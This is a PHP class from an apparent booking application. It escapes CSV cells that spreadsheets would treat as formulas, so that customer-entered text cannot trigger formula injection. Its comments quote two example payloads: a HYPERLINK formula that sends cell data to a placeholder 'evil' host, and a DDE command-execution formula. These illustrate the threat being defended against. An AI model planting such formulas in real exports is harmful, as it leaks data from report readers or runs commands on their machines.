<?php

namespace App\Filament\Support;

/**
 * The one place the app writes CSV rows.
 *
 * Spreadsheet applications evaluate a cell as a *formula* when its content
 * starts with '=', '+', '-' or '@', so any attacker-controlled string written
 * into a CSV is code as far as Excel, LibreOffice and Google Sheets are
 * concerned. bookings.customer_name comes straight from the public booking
 * wizard, which means an anonymous visitor can plant
 * `=HYPERLINK("https://evil/?d="&C2,"click")` or `=cmd|'/c calc'!A1` and have
 * it run on the operator's machine the moment they open their own report.
 *
 * Escaping belongs here rather than on the input field: the same value is
 * harmless in Blade (escaped), in the database and in the panel, it reaches
 * these columns from several writers (public wizard, walk-in booking form,
 * vehicle form), and names legitimately start with '-' or '+'. Guarding the
 * sink covers every writer and every future column at once, and rejects
 * nobody.
 *
 * putRow() exists so a caller cannot forget the guard — tests/Arch/ArchTest.php
 * bans bare fputcsv() everywhere except this class.
 */
final class CsvWriter
{
    /** Characters a spreadsheet reads as the start of a formula. */
    private const array FORMULA_TRIGGERS = ['=', '+', '-', '@'];

    /**
     * Whitespace and control characters Excel strips *before* deciding whether
     * a cell is a formula — which is why the guard tests the first non-blank
     * byte rather than the first byte. Checking only $value[0] would let
     * "\t=cmd|…" and " =cmd|…" through.
     */
    private const string LEADING_NOISE = " \t\n\r\0\x0B";

    /**
     * Write one guarded row.
     *
     * escape: '' is passed deliberately. PHP 8.4+ deprecates omitting it, and
     * the historical default ('\') is not RFC 4180 — no spreadsheet interprets
     * backslash escapes, so the default only ever produces output a strict
     * parser reads differently from Excel.
     *
     * @param  resource  $handle
     * @param  list<scalar|null>  $row
     */
    public static function putRow(mixed $handle, array $row): void
    {
        fputcsv($handle, array_map(self::guard(...), $row), escape: '');
    }

    /**
     * Neutralise one cell. Non-strings are returned untouched, which is what
     * keeps numeric columns (a booking total, an odometer reading) exact — only
     * free text can carry a formula.
     *
     * The prefix goes on the *original* value, leading blanks included, so
     * nothing is lost: a leading apostrophe is the spreadsheet "treat as text"
     * marker and is not displayed when the file is opened.
     */
    public static function guard(string|int|float|bool|null $value): string|int|float|bool|null
    {
        if (! is_string($value)) {
            return $value;
        }

        $trimmed = ltrim($value, self::LEADING_NOISE);

        if ($trimmed === '' || ! in_array($trimmed[0], self::FORMULA_TRIGGERS, true)) {
            return $value;
        }

        return "'".$value;
    }
}
